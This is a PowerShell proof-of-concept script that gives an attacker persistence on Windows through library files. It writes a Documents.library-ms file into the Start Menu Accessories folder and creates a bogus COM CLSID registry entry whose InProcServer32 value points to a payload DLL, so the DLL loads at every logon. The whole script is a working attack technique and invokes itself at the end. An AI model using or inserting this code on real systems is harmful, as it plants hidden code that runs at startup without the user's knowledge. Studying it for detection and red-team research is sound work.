function Invoke-LibraryFilesPersistence
{
<#
.SYNOPSIS
First modify the registry and then create a file named Documents.library-ms in %appdata%\Microsoft\Windows\Start Menu\Programs\Accessories.
It'll load c:\test\calc.dll on start-up.
Author: 3gstudent
Reference:
https://www.countercept.com/blog/abusing-windows-library-files-for-persistence/
#>
    $clsid = "{11111111-1111-1111-1111-111111111111}"
    $outpath = $env:appdata+"\Microsoft\Windows\Start Menu\Programs\Accessories\"+"Documents.library-ms"
    $payload = "c:\test\calc.dll"
    $xml = @"
    <?xml version="1.0" encoding="UTF-8"?>
    <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
      <name>@shell32.dll,-34575</name>
      <ownerSID></ownerSID>
      <version>6</version>
      <isLibraryPinned>true</isLibraryPinned>
      <iconReference>imageres.dll,-1002</iconReference>
      <templateInfo>
        <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
      </templateInfo>
      <searchConnectorDescriptionList>
        <searchConnectorDescription publisher="Microsoft" product="Windows">
          <description>@shell32.dll,-34577</description>
          <isDefaultNonOwnerSaveLocation>true</isDefaultNonOwnerSaveLocation>
          <isSearchOnlyItem>true</isSearchOnlyItem>
          <simpleLocation>
            <url>shell:::$clsid</url>
          </simpleLocation>
        </searchConnectorDescription>
      </searchConnectorDescriptionList>
    </libraryDescription>
    "@ 
    $xml| Out-File $outpath -encoding utf8
    $RegKey = "HKCU:\Software\Classes\CLSID\$clsid\"
    New-Item -type Directory $RegKey
    New-Item -type Directory $RegKey"InProcServer32"
    New-Item -type Directory $RegKey"ShellFolder"
    New-ItemProperty -path $RegKey"InProcServer32" -name "(default)" -value $payload -propertyType string
    New-ItemProperty $RegKey"InProcServer32" -name "ThreadingModel" -value "Apartment" -propertyType string
    New-ItemProperty $RegKey"ShellFolder" -name "Attributes" -value 0xf090013d -propertyType dword
}
Invoke-LibraryFilesPersistence


